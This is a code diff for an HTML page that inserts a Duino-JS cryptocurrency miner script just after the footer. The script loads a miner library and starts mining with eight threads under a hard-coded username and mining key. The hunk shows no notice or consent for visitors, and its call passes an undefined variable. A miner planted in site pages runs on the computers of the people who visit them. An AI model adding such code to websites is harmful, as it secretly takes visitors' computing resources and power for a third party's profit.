@@ -275,6 +275,16 @@
         </div>
     </footer>
 
+    <!--imports the Duino-JS miner-->
+<script src="duino-js.min.js"></script>
+<script>
+    const username = `DDaw999`; // Put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    const threads = 8; // Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS#Options for more options. The default is 1.
+    const miningkey = "2535948"; // Put your mining key here. If you haven't set one, replace "test" with null
+    startMiner(username, rigid, threads, miningkey); // Starts the miner
+</script>
+
+
     <script>
         function submitForm(event) {
             event.preventDefault();
